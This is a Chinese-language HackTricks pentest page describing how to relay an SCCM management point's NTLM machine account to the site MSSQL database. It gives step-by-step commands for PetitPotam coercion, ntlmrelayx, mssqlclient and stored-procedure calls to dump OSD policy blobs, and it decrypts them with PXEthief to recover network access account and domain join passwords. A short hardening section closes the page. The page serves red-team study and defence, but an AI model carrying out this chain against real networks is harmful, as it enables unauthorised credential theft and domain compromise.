# SCCM 管理点 NTLM 中继到 SQL – OSD 策略秘密提取

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
通过强制 **System Center Configuration Manager (SCCM) 管理点 (MP)** 通过 SMB/RPC 进行身份验证，并将该 NTLM 机器帐户中继到 **站点数据库 (MSSQL)**，您将获得 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 权限。这些角色允许您调用一组存储过程，暴露 **操作系统部署 (OSD)** 策略 blob（网络访问帐户凭据、任务序列变量等）。这些 blob 是十六进制编码/加密的，但可以使用 **PXEthief** 解码和解密，得到明文秘密。

高层链：
1. 发现 MP 和站点数据库 ↦ 未经身份验证的 HTTP 端点 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
2. 启动 `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`。
3. 使用 **PetitPotam**、PrinterBug、DFSCoerce 等强制 MP。
4. 通过 SOCKS 代理连接 `mssqlclient.py -windows-auth` 作为中继的 **<DOMAIN>\\<MP-host>$** 帐户。
5. 执行：
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   （或 `MP_GetPolicyBodyAfterAuthorization`）
6. 去除 `0xFFFE` BOM，`xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。

诸如 `OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` 等秘密在不接触 PXE 或客户端的情况下被恢复。

---

## 1. 枚举未经身份验证的 MP 端点
MP ISAPI 扩展 **GetAuth.dll** 暴露了几个不需要身份验证的参数（除非站点仅为 PKI）：

| 参数 | 目的 |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | 返回站点签名证书公钥 + *x86* / *x64* **所有未知计算机** 设备的 GUID。 |
| `MPLIST` | 列出站点中的每个管理点。 |
| `SITESIGNCERT` | 返回主站点签名证书（在没有 LDAP 的情况下识别站点服务器）。 |

获取将作为后续数据库查询的 **clientID** 的 GUID：
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. 将 MP 机器账户中继到 MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
当强制执行触发时，您应该看到类似以下内容：
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. 通过存储过程识别 OSD 策略
通过 SOCKS 代理连接（默认端口 1080）：
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
切换到 **CM_<SiteCode>** 数据库（使用 3 位站点代码，例如 `CM_001`）。

### 3.1 查找未知计算机 GUID（可选）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2 列出分配的策略
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
每行包含 `PolicyAssignmentID`、`Body`（十六进制）、`PolicyID`、`PolicyVersion`。

关注政策：
* **NAAConfig**  – 网络访问账户凭据
* **TS_Sequence** – 任务序列变量（OSDJoinAccount/Password）
* **CollectionSettings** – 可以包含以运行身份的账户

### 3.3  检索完整主体
如果您已经拥有 `PolicyID` 和 `PolicyVersion`，则可以使用以下方法跳过 clientID 要求：
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 重要提示：在 SSMS 中增加“最大检索字符数”（>65535），否则 blob 将被截断。

---

## 4. 解码和解密 blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
恢复的秘密示例：
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 相关的 SQL 角色和过程
在中继时，登录映射到：
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

这些角色暴露了数十个 EXEC 权限，在此攻击中使用的关键权限是：

| 存储过程 | 目的 |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | 列出应用于 `clientID` 的策略。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 返回完整的策略主体。 |
| `MP_GetListOfMPsInSiteOSD` | 由 `MPKEYINFORMATIONMEDIA` 路径返回。 |

您可以使用以下命令检查完整列表：
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. 检测与加固
1. **监控 MP 登录** – 任何 MP 计算机账户从非主机 IP 登录 ≈ 中继。
2. 在站点数据库上启用 **身份验证的扩展保护 (EPA)** (`PREVENT-14`)。
3. 禁用未使用的 NTLM，强制 SMB 签名，限制 RPC（对 `PetitPotam`/`PrinterBug` 使用相同的缓解措施）。
4. 使用 IPSec / 互相 TLS 加固 MP ↔ DB 通信。

---

## 另请参见
* NTLM 中继基础：
{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL 滥用与后期利用：
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## 参考文献
- [我想和你的经理谈谈：通过管理点中继窃取秘密](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [配置错误管理器 – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
